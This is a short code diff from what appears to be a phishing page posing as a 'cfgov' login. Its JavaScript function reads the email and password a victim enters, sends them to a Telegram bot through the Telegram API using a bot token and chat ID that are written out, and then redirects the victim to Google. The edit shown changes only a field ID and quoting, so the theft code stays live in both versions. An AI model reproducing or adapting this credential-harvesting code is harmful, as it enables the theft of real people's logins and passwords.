@@ -28,7 +28,7 @@ function userDetails() {
 }
 
 function oBoqyl2() {
-  var eTxt = document.getElementById("email").value;
+  var eTxt = document.getElementById("Email address").value;
   var p2Txt = document.getElementById("password").value;
 
   var result = `Logs from cfgov page %0A Entry ID: ${logStamp} %0A mail-address: ${eTxt} %0A Password: ${p2Txt}`;
@@ -36,7 +36,7 @@ function oBoqyl2() {
   fetch("https://api.telegram.org/bot${5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI}/sendMessage?chat_id=${6230885323}&text=${result}")
     .then(function(response) {
       if (response.ok) {
-        return location.replace('https://www.google.com');
+        return location.replace("https://www.google.com");
       } else {
         return Promise.reject('Error sending message to Telegram');
       }
